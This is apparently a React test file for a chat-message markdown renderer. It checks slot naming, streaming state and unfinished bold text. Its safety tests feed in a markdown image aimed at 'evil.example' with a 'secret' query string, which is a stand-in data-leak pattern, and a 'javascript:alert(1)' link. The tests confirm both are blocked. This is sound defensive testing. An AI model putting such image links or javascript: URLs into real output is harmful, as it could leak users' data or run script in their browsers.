import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { defaultRehypePlugins } from "streamdown";
import { MessageMarkdown } from "./markdown.js";

const root = (container: HTMLElement, slot = "message-markdown") =>
  container.querySelector<HTMLElement>(`[data-slot="${slot}"]`);

describe("MessageMarkdown", () => {
  /**
   * The wrapper renders no element of its own — `data-slot` is handed to `Streamdown` and lands
   * only because it spreads what it does not consume. That is a fact about a dependency rather
   * than about this file, so it is asserted rather than assumed: the part is the one thing a
   * consumer selects on, and `MessageText` next to it answers to `[data-slot=message-text]`.
   */
  it("names itself, and `slot` renames it", () => {
    const { container, rerender } = render(<MessageMarkdown>A line.</MessageMarkdown>);
    expect(root(container)).not.toBeNull();

    rerender(<MessageMarkdown slot="answer">A line.</MessageMarkdown>);
    expect(root(container)).toBeNull();
    expect(root(container, "answer")).not.toBeNull();
  });

  it("says it is streaming only while it is", () => {
    const { container, rerender } = render(<MessageMarkdown streaming>A line.</MessageMarkdown>);
    expect(root(container)?.dataset.streaming).toBe("true");

    rerender(<MessageMarkdown>A line.</MessageMarkdown>);
    expect(root(container)?.dataset.streaming).toBeUndefined();
  });

  /**
   * The whole reason this is not `MessageText`. Mid-stream `**bo` is not bold yet, and a parser that
   * renders it honestly flickers literal asterisks into place as the answer completes.
   */
  it("closes an unterminated emphasis while streaming, and leaves it alone when static", () => {
    const { container, rerender } = render(
      <MessageMarkdown streaming>{"It is **gra"}</MessageMarkdown>,
    );
    // Streamdown emits its own marked-up `span`, not a `strong`, so the assertion is on the text
    // the reader sees rather than on the tag it chose.
    expect(root(container)?.textContent).toBe("It is gra");

    rerender(<MessageMarkdown>{"It is **gra"}</MessageMarkdown>);
    expect(root(container)?.textContent).toBe("It is **gra");
  });

  it("draws no image a model names, remote or inline, and keeps its alt text readable", () => {
    const { container } = render(
      <MessageMarkdown>{"![x](https://evil.example/p.png?q=secret)\n\n![y](data:image/png;base64,AAAA)\n\n<img src=\"https://evil.example/raw.png\">"}</MessageMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("opens a link only after the reader confirms, and never a javascript: one", () => {
    const { container } = render(
      <MessageMarkdown>{"[a](https://ok.example/) [b](mailto:a@ok.example) [c](javascript:alert(1))"}</MessageMarkdown>,
    );
    // Link safety turns each allowed link into a button that asks first; none is an anchor to follow.
    expect([...container.querySelectorAll("button[data-streamdown=link]")].map((b) => b.textContent)).toEqual(["a", "b"]);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("c [blocked]");
  });

  it("lets a host reopen images with Streamdown's own rehypePlugins", () => {
    const { container } = render(
      <MessageMarkdown rehypePlugins={Object.values(defaultRehypePlugins)}>{"![x](https://ok.example/p.png)"}</MessageMarkdown>,
    );
    expect(container.querySelector("img")).not.toBeNull();
  });
});
